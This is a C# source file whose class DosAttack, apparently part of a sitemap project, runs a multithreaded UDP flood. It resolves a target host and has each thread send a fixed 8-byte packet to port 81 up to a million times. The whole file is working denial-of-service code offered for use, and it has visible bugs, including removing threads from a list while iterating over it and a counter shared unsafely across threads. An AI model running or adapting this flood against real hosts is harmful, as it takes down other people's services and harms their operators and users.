using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Web;

namespace Sitemap.Presentation.Services
{
    public class DosAttack
    {
        public bool dos { get; set; }
        public string siteIp { get; set; }
        private int counter { get; set; } = 0;
        static List<Thread> threads;
        public DosAttack()
        {
            dos = true;
        }
        public void ChangeDosAttackState()
        {
            foreach (Thread t in threads) {
                t.Abort();
                threads.Remove(t);
            }
        }

        public void Start(int threadCount)
        {
            threads = new List<Thread>();

             for (int i = 0; i <= threadCount; i++)
             {
                Thread t = new Thread(StartDosAttack);
                threads.Add(t);
                t.Start();
            }
             //Task.WaitAll(dosThread);
        }

        void StartDosAttack()
        {
            var port = 81;
            var soc = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);

            IPHostEntry ipHostInfo = Dns.Resolve(siteIp);
            IPAddress ipAddress = ipHostInfo.AddressList[0];
            //var ip = IPAddress.Parse(siteIp);


            var sendMess = Encoding.ASCII.GetBytes("\x17\x00\x03\x2a\x00\x00\x00\x00");
            var endPoint = new IPEndPoint(ipAddress, port);

            while (counter < 1000000)
            {
                soc.SendTo(sendMess, endPoint);
                counter++;
            }
            soc.Dispose();
        }
    }
}